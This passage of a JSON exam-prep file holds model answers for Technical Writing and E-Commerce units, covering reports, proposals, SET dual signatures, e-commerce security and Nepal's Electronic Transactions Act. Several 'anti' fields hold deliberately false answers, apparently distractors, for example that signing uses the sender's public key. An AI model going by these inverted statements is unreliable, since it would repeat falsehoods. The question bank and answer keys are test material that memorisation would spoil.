room.","skel":["Define oral reporting with three examples","Four reasons it decides careers","Five steps: audience, structure, visuals, rehearsal, delivery","Close: every oral report carries an ask"],"logic":"The stem is truncated but the argument is a career one: oral reporting is the visible half of professional competence. Marks go to structure and delivery, not praise for speaking.","how":"Concede that it decides careers, give four reasons, then a five-step method. Quote roughly 130 words a minute and end on an ask.","gateA":"Oral reporting is the spoken delivery of findings or progress — a briefing, a project update, a viva, a client pitch. In most organisations you are judged on it more than on your files, because it is the performance senior people actually see.\n\nWhy it decides your career:\n• Visibility — a clear ten-minute update makes your work known; silent good work stays invisible.\n• Public judgement — a muddled answer in a meeting is remembered longer than a good report.\n• Trust — managers promote people who can explain risk calmly to a client.\n\nHow to handle it:\n1. Analyse audience and purpose; write the core message in one sentence.\n2. Structure: hook and roadmap → three main points with evidence → summary and a specific request.\n3. One clear visual per point.\n4. Rehearse aloud and timed; anticipate five questions.\n5. Deliver with eye contact, about 130 words a minute, pauses, no reading.\n\nClose by stating what you need and by when; an oral report without an ask wastes the room. Define oral reporting with three examples Four reasons it decides careers Five steps: audience, structure, visuals, rehearsal, delivery Close: every oral report carries an ask","anti":""},"keys":["6x6 rule","Core message","Opening moves","Transition","AIDA in talks","Speaking pace"],"ask":[{"id":"tw-73","q":"“The success with which you handle oral reporting may determine whether you are","y":"TW Question Bank 2079","marks":10,"rep":0},{"id":"tw-79","q":"You have to give a presentation on one of the occasions at college. Write a short speech","y":"TW Question Bank 2079","marks":10,"rep":0},{"id":"tw-10","q":"What are the characteristics of an effective presentation?","y":"TW Question Bank 2082","marks":5,"rep":0},{"id":"tw-57","q":"Write short notes on:","y":"TW Question Bank 2080","marks":5,"rep":0}],"reps":[]},{"n":10,"name":"Recommendation Reports","rank":11,"q":2,"m":20,"share":3,"cum":97,"hook":"The ward must choose one of three sites for a water tank, and the council meets on Friday.","idea":"A recommendation report hands a decision to someone who was not present, so it must carry the reasoning in the order the reader will test it. Criteria come before options, because criteria chosen after seeing the options are only justification. Findings compare options against criteria with evidence, conclusions say what the comparison means, and recommendations say what to do, in what order, accepting which trade-off. Criteria written after the options are seen can only justify a preference already held, so they stop being evidence and become advocacy; fixing cost, time, risk and support first keeps the decision-maker arguing about the standard once instead of re-litigating each site.","one":"Criteria before options, evidence before opinion, and one recommendation the reader can act on without you.","gate":{"q":"Why must the criteria be fixed before the options are examined?","a":"Criteria written after the options are seen can only justify a preference already held, so they stop being evidence and become advocacy. Fixing cost, time, risk and support first lets every option be scored against the same standard, and lets the decision-maker argue about the standard once rather than re-litigating each site. The consequence is a recommendation the absent reader can test."},"top":{"id":"tw-13","q":"What is a recommendation report and how does it differ from a proposal? Your IT consulting firm has been asked by a client to evaluate three different cloud storage solutions (Google Drive, Dropbox, and Microsoft OneDrive) and recommend the best option for their 50-employee business. Write a recommendation report that includes problem statement, evaluation criteria, detailed analysis of each option, and your recommendation with proper justification.","y":"TW Model Set I","marks":10,"rep":0,"ans":"A recommendation report analyses a problem, evaluates alternatives against stated criteria and recommends one course of action. A proposal asks for approval or money to do work. The report answers which option; the proposal answers may I proceed.\n\nRecommendation Report: Cloud Storage for a 50-Employee Business\nProblem: files sit on two local servers, email attachments exceed 25 MB, and there is no off-site backup.\nCriteria: cost per user per month, storage, security (2FA, encryption), collaboration, admin control, migration effort.\nAnalysis:\n• Google Drive — Rs 850 per user for 2 TB; strongest real-time collaboration; limited admin reporting.\n• Dropbox — Rs 950 per user for 2 TB; best sync reliability and version history; weaker document editing.\n• OneDrive — Rs 780 per user with 1 TB; native to the existing Microsoft 365 licences; best access control and audit logs.\nConclusion: costs are close; OneDrive wins on integration, admin control and least retraining.\nRecommendation: adopt OneDrive for all 50 accounts, migrate the shared drive over three weekends, enable 2FA and a retention policy, and review after three months.","skel":["Define recommendation report vs proposal","Problem and criteria","Three options, same criteria","Conclusion: costs close, integration decides","One recommendation with migration steps"],"logic":"Tests three layers: the definition, the report-versus-proposal distinction and the ability to produce a real evaluation with criteria before options. Hedging instead of recommending loses marks.","how":"One sentence on each genre, then write the report: problem, criteria, three options, conclusion, one recommendation. Use a criteria-first order.","gateA":"A recommendation report analyses a problem, evaluates alternatives against stated criteria and recommends one course of action. A proposal asks for approval or money to do work. The report answers which option; the proposal answers may I proceed.\n\nRecommendation Report: Cloud Storage for a 50-Employee Business\nProblem: files sit on two local servers, email attachments exceed 25 MB, and there is no off-site backup.\nCriteria: cost per user per month, storage, security (2FA, encryption), collaboration, admin control, migration effort.\nAnalysis:\n• Google Drive — Rs 850 per user for 2 TB; strongest real-time collaboration; limited admin reporting.\n• Dropbox — Rs 950 per user for 2 TB; best sync reliability and version history; weaker document editing.\n• OneDrive — Rs 780 per user with 1 TB; native to the existing Microsoft 365 licences; best access control and audit logs.\nConclusion: costs are close; OneDrive wins on integration, admin control and least retraining.\nRecommendation: adopt OneDrive for all 50 accounts, migrate the shared drive over three weekends, enable 2FA and a retention policy, and review after three months. Define recommendation report vs proposal Problem and criteria Three options, same criteria Conclusion: costs close, integration decides One recommendation with migration steps","anti":""},"keys":["Recommendation report","Feasibility report","Criteria","Options x criteria matrix","Executive summary","Memo of transmittal"],"ask":[{"id":"tw-13","q":"What is a recommendation report and how does it differ from a proposal? Your IT consulting firm has been asked by a client to evaluate three different cloud storage solutions (Google Drive, Dropbox, and Microsoft OneDrive) and recommend the best option for their 50-employee business. Write a recommendation report that includes problem statement, evaluation criteria, detailed analysis of each option, and your recommendation with proper justification.","y":"TW Model Set I","marks":10,"rep":0},{"id":"tw-80","q":"Write a recommendation report to Kathmandu Metropolitian City in which you suggest","y":"TW Question Bank 2079","marks":10,"rep":0}],"reps":[]},{"n":11,"name":"Proposals","rank":12,"q":2,"m":20,"share":3,"cum":100,"hook":"A training institute promises a bank three days of Excel training, and names the price before being asked.","idea":"A proposal is a promise with a price, written so the reader can say yes without a meeting. A recommendation report only tells the reader what to decide; accepting it commissions nobody, while accepting a proposal commissions the writer. That means the problem in the reader's own words, the work described concretely enough to be checked, a schedule, named people, an itemized budget with its assumptions, and acceptance criteria that define finished. Persuasion comes from evidence and a realistic price, not from adjectives.","one":"A proposal is a promise with a price: this work, by these people, by this date, for this sum.","gate":{"q":"How does a proposal differ from a recommendation report on the same problem?","a":"A recommendation report analyses options and tells the reader what to decide, while a proposal promises that the writer will do specific work for a stated price. So the proposal carries deliverables, method, milestones, named staff, an itemised budget with assumptions and acceptance criteria. The difference matters because a recommendation can be accepted without anyone being commissioned, and a proposal cannot."},"top":{"id":"tw-43","q":"Suppose you are working as an IT expert in the National Bank of Nepal, and working staff need five laptops for daily operation. Your manager asks you to present a proposal with time, cost, and objectives. Write a short proposal comparing the laptops available in the market of at least three renowned companies. Your proposal must include problems, solutions, and findings.","y":"TW Question Bank 2080","marks":10,"rep":0,"ans":"PROPOSAL: Five laptops for the Operations Department\nTo: Manager, National Bank of Nepal, Kathmandu   From: IT Expert   Date: 12 Mangsir 2082\n\n1. Problem. Five operations staff share three six-year-old desktops. Boot takes four minutes, the core banking client crashes during end-of-day posting, and Windows 10 support has ended — a security and audit risk.\n\n2. Objectives. Buy five business laptops that (a) run the core banking client and Office smoothly, (b) meet the bank's endpoint-security policy, (c) cost under NPR 1,00,000 each, (d) last four years.\n\n3. Options (dealer survey, Kathmandu, Asar 2082):\nModel                 CPU / RAM / SSD          Price NPR   Warranty\nDell Latitude 3450    i5-1335U / 16GB / 512GB    96,500    3 years\nHP ProBook 450 G10    i5-1334U / 16GB / 512GB    92,000    1 year\nLenovo ThinkPad E14   i5-1335U / 16GB / 512GB    98,000    3 years\n\n4. Findings. All three handle the workload. HP is cheapest, but a two-year warranty extension adds about NPR 9,000. ThinkPad has the best keyboard and spill resistance; Dell is cheapest to service locally with next-day support.\n\n5. Solution and cost. Five ThinkPad E14 at NPR 98,000 = NPR 4,90,000, plus docking stations and cases NPR 35,000; total NPR 5,25,000 including VAT.\n\n6. Time. Approval this week, delivery in 7 days, imaging, domain join and handover in 3 days — all staff working on new machines within 12 days.\n\nApproval requested for NPR 5,25,000.","skel":["Header and problem statement","Four measurable objectives","Three-model table with prices","Findings and justified choice","Total cost, timeline, approval request"],"logic":"A full internal proposal under a scenario: it tests structure (problem, objectives, options, findings, cost, schedule, approval) and the discipline of a justified single recommendation.","how":"Memo header, then problem, objectives, a three-model table, findings, recommendation with total cost, and a 12-day schedule.","gateA":"PROPOSAL: Five laptops for the Operations Department\nTo: Manager, National Bank of Nepal, Kathmandu   From: IT Expert   Date: 12 Mangsir 2082\n\n1. Problem. Five operations staff share three six-year-old desktops. Boot takes four minutes, the core banking client crashes during end-of-day posting, and Windows 10 support has ended — a security and audit risk.\n\n2. Objectives. Buy five business laptops that (a) run the core banking client and Office smoothly, (b) meet the bank's endpoint-security policy, (c) cost under NPR 1,00,000 each, (d) last four years.\n\n3. Options (dealer survey, Kathmandu, Asar 2082):\nModel                 CPU / RAM / SSD          Price NPR   Warranty\nDell Latitude 3450    i5-1335U / 16GB / 512GB    96,500    3 years\nHP ProBook 450 G10    i5-1334U / 16GB / 512GB    92,000    1 year\nLenovo ThinkPad E14   i5-1335U / 16GB / 512GB    98,000    3 years\n\n4. Findings. All three handle the workload. HP is cheapest, but a two-year warranty extension adds about NPR 9,000. ThinkPad has the best keyboard and spill resistance; Dell is cheapest to service locally with next-day support.\n\n5. Solution and cost. Five ThinkPad E14 at NPR 98,000 = NPR 4,90,000, plus docking stations and cases NPR 35,000; total NPR 5,25,000 including VAT.\n\n6. Time. Approval this week, delivery in 7 days, imaging, domain join and handover in 3 days — all staff working on new machines within 12 days.\n\nApproval requested for NPR 5,25,000. Header and problem statement Four measurable objectives Three-model table with prices Findings and justified choice Total cost, timeline, approval request","anti":""},"keys":["Proposal","Solicited proposal","Unsolicited proposal","Internal proposal","Statement of work","Gantt chart"],"ask":[{"id":"tw-43","q":"Suppose you are working as an IT expert in the National Bank of Nepal, and working staff need five laptops for daily operation. Your manager asks you to present a proposal with time, cost, and objectives. Write a short proposal comparing the laptops available in the market of at least three renowned companies. Your proposal must include problems, solutions, and findings.","y":"TW Question Bank 2080","marks":10,"rep":0},{"id":"tw-81","q":"Write a proposal convincing your parents or guardians to allow you to go with friends on the vacation of your dreams","y":"TW Question Bank 2079","marks":10,"rep":0}],"reps":[]}]},"ecom":{"name":"E-Commerce","code":"CSC381","exam":"2026-12-27","totalQ":69,"totalM":435,"units":[{"n":2,"name":"E-commerce Business Model","rank":1,"q":12,"m":85,"share":20,"cum":20,"hook":"The shop sells one egg at a time until a restaurant asks for two hundred, invoiced at month end.","idea":"A business model is one sentence about who pays whom, for what, and why they keep paying. An e-tailer buys stock, holds it and keeps the margin between cost and price, so unsold inventory is its own loss; a market creator never owns the goods and charges sellers a fee or commission on completed trades, so its revenue follows volume while stock risk stays with the seller. That is why marketplaces grow on thin capital, and why the eight elements — value proposition, revenue model, market, rivals, advantage, strategy, organisation and team — decide whether the sentence survives the second year.","one":"A business model is one sentence about who pays whom and why they keep paying; the eight elements make it true.","gate":{"q":"Why does a market creator carry less inventory risk than an e-tailer while earning only a fee?","a":"An e-tailer buys stock, holds it and keeps the margin between cost and price, so unsold inventory is its own loss. A market creator never owns the goods and charges sellers a fee or commission on completed trades, so its revenue follows volume while stock risk stays with the seller. That is why marketplaces grow on thin capital."},"top":{"id":"ecom-15","q":"What is B 2 B e-commerce? Discuss various B 2 B business models.","y":"E-commerce Question Bank 2081","marks":10,"rep":0,"ans":"B2B e-commerce covers transactions between organisations — a manufacturer buying parts, a retailer buying stock. Compared with B2C it has fewer but larger buyers, higher order values, negotiated prices, longer approval cycles, and EDI or API integration instead of a consumer checkout.\n• E-distributor — one firm sells its own catalogue to many business buyers at posted prices, e.g. Grainger; in Nepal, a hardware wholesaler with a dealer portal.\n• E-procurement — sells procurement software and services that automate requisition to payment, e.g. Ariba; value comes from spend control and less maverick buying.\n• Exchange — many buyers and sellers trade commodities at spot prices, e.g. Go2Paper.\n• Industry consortium — an exchange owned by large firms in one industry, restricted membership and negotiated contracts, e.g. Covisint, Exostar.\n• Private industrial network — a closed network sponsored by one large buyer linking suppliers for forecasting and replenishment, e.g. Walmart Retail Link.\nRevenue: sales margin, transaction fees, subscription, member fees, shared savings.","skel":["B2B = business-to-business transactions","Few buyers, large orders, negotiated prices","Net marketplaces: e-distributor, e-procurement","Exchanges and industry consortia","Private industrial networks: one sponsor"],"logic":"A core Unit 2 question. The examiner wants the four net-marketplace types plus private networks, each with an example, and the recognition that B2B differs from B2C in scale and negotiation.","how":"Define B2B in three contrasts with B2C, then five models as a labelled list with one example each. A small 2×2 sketch of marketplace vs private network helps.","gateA":"B2B e-commerce covers transactions between organisations — a manufacturer buying parts, a retailer buying stock. Compared with B2C it has fewer but larger buyers, higher order values, negotiated prices, longer approval cycles, and EDI or API integration instead of a consumer checkout.\n• E-distributor — one firm sells its own catalogue to many business buyers at posted prices, e.g. Grainger; in Nepal, a hardware wholesaler with a dealer portal.\n• E-procurement — sells procurement software and services that automate requisition to payment, e.g. Ariba; value comes from spend control and less maverick buying.\n• Exchange — many buyers and sellers trade commodities at spot prices, e.g. Go2Paper.\n• Industry consortium — an exchange owned by large firms in one industry, restricted membership and negotiated contracts, e.g. Covisint, Exostar.\n• Private industrial network — a closed network sponsored by one large buyer linking suppliers for forecasting and replenishment, e.g. Walmart Retail Link.\nRevenue: sales margin, transaction fees, subscription, member fees, shared savings. B2B = business-to-business transactions Few buyers, large orders, negotiated prices Net marketplaces: e-distributor, e-procurement Exchanges and industry consortia Private industrial networks: one sponsor","anti":"B2B e-commerce is selling to consumers, so it has many small buyers, low order values, posted prices and short approval cycles; e-distributors and exchanges are consumer marketplaces, and private networks have no sponsor."},"keys":["Business model","Value proposition","Revenue model","Competitive advantage","E-tailer","Market creator"],"ask":[{"id":"ecom-15","q":"What is B 2 B e-commerce? Discuss various B 2 B business models.","y":"E-commerce Question Bank 2081","marks":10,"rep":0},{"id":"ecom-25","q":"What is competitive advantage in a business model? How can firms achieve competitive advantage using dimensions of asymmetry, complementary resources, perfect market and leverage?","y":"E-commerce Question 2080","marks":10,"rep":0},{"id":"ecom-51","q":"What is EDI? How EDI is used in ecommerce. How EDI has influenced information flow in international trade?","y":"E-commerce Question 2076","marks":10,"rep":0},{"id":"ecom-58","q":"Explain different types of B2C business models with examples.","y":"E-commerce Question 2079","marks":10,"rep":0}],"reps":[]},{"n":3,"name":"Electronic Payment System","rank":2,"q":11,"m":85,"share":20,"cum":39,"hook":"At a Daraz checkout the card number crosses six hands, and every one of them could copy it.","idea":"An e-payment moves value through a chain: cardholder, merchant, gateway, acquiring bank, association, issuing bank. SET splits the purchase into order information for the shop and payment information for the bank, and the cardholder signs the two digests together, so nobody on the chain sees the whole purchase and nobody can repudiate their half. The bank must read the card and the merchant must read the order, yet neither may read both, so altering either half breaks verification and no party can deny the half it sent.","one":"SET is a double envelope: the shop reads the order, the bank reads the card, one seal proves they belong together.","gate":{"q":"Why does SET need a dual signature rather than one signature over the whole purchase?","a":"The merchant must read the order and the bank must read the card, yet neither may read both. So the cardholder hashes each half, signs the two digests together, and sends that one signature attached to each half. Altering either half breaks verification, and no party can deny the half it sent."},"top":{"id":"ecom-13","q":"What is a dual signature? Describe the dual signature operations? How is dual signature used during purchase request operation of SET protocol?","y":"E-commerce Question Bank 2081","marks":10,"rep":0,"ans":"A dual signature lets a cardholder sign order information (OI) and payment information (PI) so that the merchant sees only OI and the bank only PI, yet both can prove they belong to the same purchase.\n1. Compute H(OI) and H(PI).\n2. Concatenate and hash again: H(H(OI) || H(PI)).\n3. Encrypt with the cardholder's private key — the dual signature DS.\n4. Send the merchant OI, H(PI), DS; send the gateway PI, H(OI), DS.\n5. Merchant hashes OI, joins it with H(PI), decrypts DS with the public key and compares; the gateway does the mirror check.\nEach party verifies using its own half plus the digest of the half it never sees, so neither reads the other's data, but a mismatch proves tampering. This gives confidentiality, integrity and non-repudiation.\nIn the SET purchase request, PReq carries OI and DS to the merchant, which verifies and forwards PI, H(OI) and DS to the gateway in AuthReq. The issuer then authorises exactly the amount signed for the order the merchant will fulfil.","skel":["Problem: buyer wants privacy from each party","Hash OI and PI separately","Hash the two hashes together, sign it","Merchant verifies half, gateway the other","Both halves provably belong to one order"],"logic":"The classic SET 10-marker. It tests the actual construction of the dual signature and whether you understand why it exists: merchant sees order data, bank sees payment data, neither sees both.","how":"Write the construction as a numbered 5-step flow and draw OI and PI going two ways. The 'why' line — privacy plus linkage — is worth 3 marks.","gateA":"A dual signature lets a cardholder sign order information (OI) and payment information (PI) so that the merchant sees only OI and the bank only PI, yet both can prove they belong to the same purchase.\n1. Compute H(OI) and H(PI).\n2. Concatenate and hash again: H(H(OI) || H(PI)).\n3. Encrypt with the cardholder's private key — the dual signature DS.\n4. Send the merchant OI, H(PI), DS; send the gateway PI, H(OI), DS.\n5. Merchant hashes OI, joins it with H(PI), decrypts DS with the public key and compares; the gateway does the mirror check.\nEach party verifies using its own half plus the digest of the half it never sees, so neither reads the other's data, but a mismatch proves tampering. This gives confidentiality, integrity and non-repudiation.\nIn the SET purchase request, PReq carries OI and DS to the merchant, which verifies and forwards PI, H(OI) and DS to the gateway in AuthReq. The issuer then authorises exactly the amount signed for the order the merchant will fulfil. Problem: buyer wants privacy from each party Hash OI and PI separately Hash the two hashes together, sign it Merchant verifies half, gateway the other Both halves provably belong to one order","anti":"A dual signature lets the merchant see the payment information and the bank see the order information, so privacy is lost; the cardholder signs OI and PI separately and the two halves cannot be proved to belong to the same purchase."},"keys":["Payment gateway","Issuer vs acquirer","Authorisation","Capture","Settlement","Dual signature"],"ask":[{"id":"ecom-13","q":"What is a dual signature? Describe the dual signature operations? How is dual signature used during purchase request operation of SET protocol?","y":"E-commerce Question Bank 2081","marks":10,"rep":0},{"id":"ecom-2","q":"How does e-cheque work? Consider you are planning for an e-commerce startup facilitating an auctioning service. Explain the possible types of auctioning mechanisms with their use cases that you can facilitate in your platform.","y":"E-commerce Question Bank 2082","marks":10,"rep":0},{"id":"ecom-26","q":"What is a digital wallet? How does it work? Describe the payment authorization and payment capture operations of SET.","y":"E-commerce Question 2080","marks":10,"rep":0},{"id":"ecom-39","q":"What is e-payment? Discuss how credit card transactions, electronic checks and stored value","y":"E-commerce Question 2078","marks":10,"rep":0}],"reps":[]},{"n":5,"name":"Security in E-Commerce","rank":3,"q":11,"m":70,"share":16,"cum":55,"hook":"Six things can go wrong with one deposit, and a camera only stops one of them.","idea":"Security is a chain of custody judged on six properties: confidentiality, integrity, availability, authenticity, non-repudiation and privacy. Each property names a specific harm and each harm names a mechanism, so the chain holds only where every link has its own lock. A hash is a one-way digest, so altering a single digit of the amount produces a completely different value and tampering becomes visible; but anyone can compute that same digest, so it says nothing about who wrote the message. Only encrypting the digest with the sender's private key, verified through a certificate, adds authorship and non-repudiation.","one":"Security is a chain of custody with six properties, and it breaks at the one link you did not lock.","gate":{"q":"Why does a hash prove integrity but not authenticity?","a":"A hash is a one-way digest, so altering a single digit of the amount produces a completely different value and tampering becomes visible. But anyone can compute that same digest, so it says nothing about who wrote the message. Only encrypting the digest with the sender's private key, verified through a certificate, adds authorship and non-repudiation."},"top":{"id":"ecom-3","q":"How are digital signatures used in e-commerce security? How often are social engineering attacks vulnerable to e-commerce? Being an e-commerce security expert, how can you combat social engineering attacks?","y":"E-commerce Question Bank 2082","marks":10,"rep":0,"ans":"A digital signature is the hash of a message encrypted with the sender's private key. The receiver re-hashes the message and decrypts the signature with the sender's public-key certificate; a match proves the message is unaltered and came from the key holder.\nUses in e-commerce: authenticating buyers and merchants, protecting order and payment messages, giving non-repudiation, securing SET's dual signature, and satisfying the Electronic Transactions Act 2063, which gives digital signatures legal validity.\nSocial engineering is highly effective against e-commerce because staff handle many low-value contacts, trust a familiar brand voice, and hold refund, KYC and admin powers worth money. Attacks: phishing, pretexting as eSewa support, fake courier calls, baiting, tailgating.\nCountermeasures:\n• Awareness training with simulated phishing and a no-blame reporting rule.\n• MFA and phishing-resistant logins for admin and finance; OTP never shared.\n• Callback verification before changing bank details or approving refunds.\n• Least privilege, segregation of duties, audit logs, DMARC and SPF.\n• Publish the real support channel and monitor for fake pages.","skel":["Signature = hash + private key","Verify with public key certificate","Gives integrity, authenticity, non-repudiation","Social engineering exploits trust, not code","Fix: training, MFA, verification, least privilege"],"logic":"Pairs a technical control with a human control. The examiner is checking whether you know a digital signature is not encryption, and whether you can treat people as the weakest link with real countermeasures.","how":"Draw the sign-verify flow (hash, private key, public key), then answer social engineering with a why-then-fix structure. Three fixes minimum, one Nepal example.","gateA":"A digital signature is the hash of a message encrypted with the sender's private key. The receiver re-hashes the message and decrypts the signature with the sender's public-key certificate; a match proves the message is unaltered and came from the key holder.\nUses in e-commerce: authenticating buyers and merchants, protecting order and payment messages, giving non-repudiation, securing SET's dual signature, and satisfying the Electronic Transactions Act 2063, which gives digital signatures legal validity.\nSocial engineering is highly effective against e-commerce because staff handle many low-value contacts, trust a familiar brand voice, and hold refund, KYC and admin powers worth money. Attacks: phishing, pretexting as eSewa support, fake courier calls, baiting, tailgating.\nCountermeasures:\n• Awareness training with simulated phishing and a no-blame reporting rule.\n• MFA and phishing-resistant logins for admin and finance; OTP never shared.\n• Callback verification before changing bank details or approving refunds.\n• Least privilege, segregation of duties, audit logs, DMARC and SPF.\n• Publish the real support channel and monitor for fake pages. Signature = hash + private key Verify with public key certificate Gives integrity, authenticity, non-repudiation Social engineering exploits trust, not code Fix: training, MFA, verification, least privilege","anti":"A digital signature is the message encrypted with the sender's public key and decrypted with the private key, so it proves neither integrity nor authenticity; social engineering attacks code rather than trust, and training makes users more vulnerable."},"keys":["Confidentiality","Non-repudiation","Digital signature","Digital certificate","PKI","Pharming"],"ask":[{"id":"ecom-3","q":"How are digital signatures used in e-commerce security? How often are social engineering attacks vulnerable to e-commerce? Being an e-commerce security expert, how can you combat social engineering attacks?","y":"E-commerce Question Bank 2082","marks":10,"rep":0},{"id":"ecom-38","q":"What are the security threats in e-commerce? How client server and data transactions securities are maintained in e-commerce?","y":"E-commerce Question 2078","marks":10,"rep":0},{"id":"ecom-59","q":"Why it is essential to enforce security in e-commerce? Discuss the different dimensions of e-commerce security from consumer and merchant perspectives.","y":"E-commerce Question 2079","marks":10,"rep":0},{"id":"ecom-20","q":"How cryptography and hash functions are used in e-commerce to ensure security.","y":"E-commerce Question Bank 2081","marks":5,"rep":0}],"reps":[]},{"n":6,"name":"Digital Marketing","rank":4,"q":11,"m":65,"share":15,"cum":70,"hook":"The hoarding above the paan shop is rented by the month and nobody knows who it brings in.","idea":"Digital marketing rents attention by the unit that can be counted and lets an auction set the price for each unit. Targeting decides whose attention is worth bidding for, the exchange sells it impression by impression, and acquisition cost measured against lifetime value decides whether the whole exercise made money. Click-through rate says only whether the creative earned attention, never whether the visit returned anything, so a channel whose acquisition cost exceeds lifetime value loses money on every sale however healthy its click rate looks.","one":"Digital marketing rents attention by the countable unit, at a price an auction sets in milliseconds.","gate":{"q":"Why must a campaign be judged on acquisition cost against lifetime value rather than click-through rate?","a":"Click-through rate says only whether the creative earned attention, never whether the visit returned anything. Acquisition cost divides total spend by customers won, while lifetime value is what those customers return over their whole relationship. A channel whose cost exceeds that value loses money on every sale, however healthy its click rate looks."},"top":{"id":"ecom-14","q":"What is digital marketing? Why is it essential in e-commerce? How do marketing metrics like click-through rate, bounce-back rate and conversion rate influence E-mail marketing?","y":"E-commerce Question Bank 2081","marks":10,"rep":0,"ans":"Digital marketing is promotion through digital channels — search, display, social, e-mail, mobile, affiliate and content — with measurable response at every step.\nIt is essential because a storefront has no physical presence: digital channels create discovery, cost per acquisition is trackable, targeting is precise, content builds trust before purchase, and campaigns can be tested within days. For a Nepali seller, Facebook, Instagram and an e-mail list reach buyers far cheaper than print.\n• CTR = clicks ÷ delivered × 100. It measures subject line, offer and creative relevance; a low CTR means rewrite the subject, segment the list or sharpen the call to action.\n• Bounce-back rate = bounced ÷ sent × 100. Hard bounces mean stale addresses, so prune the list; a spike signals deliverability or spam-filter trouble, which also harms sender reputation.\n• Conversion rate = orders ÷ clicks × 100. It measures landing page, price and checkout trust; good CTR with low conversion means fix the page, not the e-mail.\nTogether they locate the leak: CTR is a message problem, bounce a list problem, conversion a page problem. A/B test one variable at a time.","skel":["Digital marketing = promotion via digital channels","Essential: reach, cost, targeting, measurement","CTR: subject line and offer relevance","Bounce rate: list quality and deliverability","Conversion rate: landing page and trust"],"logic":"Tests whether you can define digital marketing and then use three funnel metrics diagnostically. Students define the metrics but cannot say what to change when each is bad.","how":"Define, give three reasons it is essential, then treat each metric as a diagnosis: what it measures, what a bad number means, what to fix.","gateA":"Digital marketing is promotion through digital channels — search, display, social, e-mail, mobile, affiliate and content — with measurable response at every step.\nIt is essential because a storefront has no physical presence: digital channels create discovery, cost per acquisition is trackable, targeting is precise, content builds trust before purchase, and campaigns can be tested within days. For a Nepali seller, Facebook, Instagram and an e-mail list reach buyers far cheaper than print.\n• CTR = clicks ÷ delivered × 100. It measures subject line, offer and creative relevance; a low CTR means rewrite the subject, segment the list or sharpen the call to action.\n• Bounce-back rate = bounced ÷ sent × 100. Hard bounces mean stale addresses, so prune the list; a spike signals deliverability or spam-filter trouble, which also harms sender reputation.\n• Conversion rate = orders ÷ clicks × 100. It measures landing page, price and checkout trust; good CTR with low conversion means fix the page, not the e-mail.\nTogether they locate the leak: CTR is a message problem, bounce a list problem, conversion a page problem. A/B test one variable at a time. Digital marketing = promotion via digital channels Essential: reach, cost, targeting, measurement CTR: subject line and offer relevance Bounce rate: list quality and deliverability Conversion rate: landing page and trust","anti":"Digital marketing is promotion through offline channels with no measurable response; it is unnecessary because a storefront has a physical presence, and CTR, bounce rate and conversion rate are unrelated to subject lines, list quality or landing-page trust."},"keys":["CTR","CPM","eCPM","RTB","DSP vs SSP","Quality score"],"ask":[{"id":"ecom-14","q":"What is digital marketing? Why is it essential in e-commerce? How do marketing metrics like click-through rate, bounce-back rate and conversion rate influence E-mail marketing?","y":"E-commerce Question Bank 2081","marks":10,"rep":0},{"id":"ecom-27","q":"What is display ad marketing? How attrition rate, view-to-cart ratio, acquisition rate and retention rate influence display ad marketing?","y":"E-commerce Question 2080","marks":10,"rep":0},{"id":"ecom-10","q":"How are reach, loyalty, and hits used in display ad marketing metrics?","y":"E-commerce Question Bank 2082","marks":5,"rep":0},{"id":"ecom-22","q":"How social marketing, mobile marketing and local marketing are used in e-commerce to promote business.","y":"E-commerce Question Bank 2081","marks":5,"rep":0}],"reps":[]},{"n":1,"name":"Introduction","rank":5,"q":10,"m":60,"share":14,"cum":84,"hook":"A kirana shop in Asan needs no website; take away its four walls and it needs a law, a courier and a bank.","idea":"E-commerce is the same shop with its walls replaced by five layers that must all work: people, public policy, marketing, support services and partnerships. A website only publishes an offer, while completing a sale still needs people to staff it, law to enforce the record, marketing to be found, support services to move money and goods, and partners to supply the stock. Remove any layer and the order dies at that point, which is why cash on delivery dominates wherever the payment layer is thin.","one":"E-commerce removes the shop's walls and replaces them with five layers that must all hold at once.","gate":{"q":"Why does e-commerce need a five-layer framework rather than simply a website and a delivery van?","a":"A website only publishes an offer, while completing a sale still needs people to staff it, law to enforce the record, marketing to be found, support services to move money and goods, and partners to supply the stock. Remove any layer and the order dies at that point, which is why cash on delivery dominates wherever the payment layer is thin."},"top":{"id":"ecom-24","q":"Briefly explain the electronic transaction act of Nepal.","y":"E-commerce Question Bank 2081","marks":5,"rep":3,"ans":"The Electronic Transactions Act, 2063 (2006) is Nepal's legal foundation for e-commerce and e-governance: it gives electronic records and signatures the standing of paper, regulates certifying authorities and punishes computer crime.\n• Legal recognition — electronic records, contracts and signatures are valid and enforceable if they meet the reliability test, and are admissible as evidence.\n• Authentication — digital signatures are verified through certificates from licensed certifying authorities; subscribers must protect private keys.\n• Offences — unauthorised access, damage to source code, computer fraud, piracy, publishing illegal content and privacy violation, each with fines and imprisonment.\n• Institutions — an Information Technology Tribunal to try these offences, with investigation and electronic-evidence provisions.\nSignificance: a Nepali business can contract, invoice and pay online with legal backing; the Act underpins wallet and gateway licensing and gives buyers a remedy against fraud.","skel":["Enacted 2063 BS to legalise e-transactions","E-records equal to paper records","Digital signatures and licensed certifying authorities","Computer offences and penalties defined","IT Tribunal and electronic evidence"],"logic":"A recall question on the legal basis of Nepali e-commerce. It tests whether you know the Act's purpose and main chapters of content, not section numbers or dates you may misremember.","how":"Answer in five blocks: purpose, e-records, signatures and CAs, offences, tribunal and evidence. One line each is enough for five marks.","gateA":"The Electronic Transactions Act, 2063 (2006) is Nepal's legal foundation for e-commerce and e-governance: it gives electronic records and signatures the standing of paper, regulates certifying authorities and punishes computer crime.\n• Legal recognition — electronic records, contracts and signatures are valid and enforceable if they meet the reliability test, and are admissible as evidence.\n• Authentication — digital signatures are verified through certificates from licensed certifying authorities; subscribers must protect private keys.\n• Offences — unauthorised access, damage to source code, computer fraud, piracy, publishing illegal content and privacy violation, each with fines and imprisonment.\n• Institutions — an Information Technology Tribunal to try these offences, with investigation and electronic-evidence provisions.\nSignificance: a Nepali business can contract, invoice and pay online with legal backing; the Act underpins wallet and gateway licensing and gives buyers a remedy against fraud. Enacted 2063 BS to legalise e-transactions E-records equal to paper records Digital signatures and licensed certifying authorities Computer offences and penalties defined IT Tribunal and electronic evidence","anti":"The Electronic Transactions Act, 2063 denies legal standing to electronic records and signatures, leaves certifying authorities unregulated, and decriminalises computer offences, so paper remains the only valid form and no tribunal exists."},"keys":["E-commerce","E-business","Ubiquity","Information density","Richness","Pure e-commerce"],"ask":[{"id":"ecom-24","q":"Briefly explain the electronic transaction act of Nepal.","y":"E-commerce Question Bank 2081","marks":5,"rep":3},{"id":"ecom-1","q":"How are people, public policy, and support services shaping the e-commerce framework? How can organizations adapt e-distribution 